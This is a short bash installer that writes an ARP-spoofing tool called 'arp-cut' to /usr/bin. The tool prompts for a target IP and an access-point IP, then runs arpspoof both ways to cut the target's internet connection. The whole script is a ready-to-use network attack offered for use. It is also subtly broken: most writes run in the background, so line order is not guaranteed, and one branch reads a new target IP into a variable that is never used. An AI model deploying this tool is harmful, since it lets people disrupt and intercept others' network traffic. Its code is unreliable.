#!/bin/bash
 echo "\e[33mInstallation has begun.\e[0m"
 echo echo ===========arp-cut=========== >> /usr/bin/arp-cut &
 echo echo Cuts target internet connection. >> /usr/bin/arp-cut &
 echo  echo Input target IP adress: >> /usr/bin/arp-cut &
 echo read t >> /usr/bin/arp-cut&
 echo  echo Your targets IP adress is '$t' . Do you want to change it? y/n >> /usr/bin/arp-cut &
 echo read c >> /usr/bin/arp-cut &
 echo if [ '$c' = y ] >> /usr/bin/arp-cut &
 echo then >> /usr/bin/arp-cut &
 echo echo Input target IP adress: >> /usr/bin/arp-cut &
 echo read x >> /usr/bin/arp-cut &
 echo fi >> /usr/bin/arp-cut &
 echo echo Enter AP IP adress: >> /usr/bin/arp-cut &
 echo read ap >> /usr/bin/arp-cut &
 echo echo Your AP IP adress is '$ap' . Do you want to change it? y/n >> /usr/bin/arp-cut &
 echo read c >> /usr/bin/arp-cut &
 echo if [ '$c' = y ] >> /usr/bin/arp-cut &
 echo then >> /usr/bin/arp-cut &
 echo echo Enter AP IP adress: >> /usr/bin/arp-cut &&
 echo read ap >> /usr/bin/arp-cut &
 echo fi >> /usr/bin/arp-cut &
 echo arpspoof -i wlan0 -t '$t' '$ap'  >> /usr/bin/arp-cut &
 echo arpspoof -i wlan0 -t '$ap' '$t' >> /usr/bin/arp-cut &
 chmod +x /usr/bin/arp-cut
echo "\e[32mInstallation Complete.\e[0m"
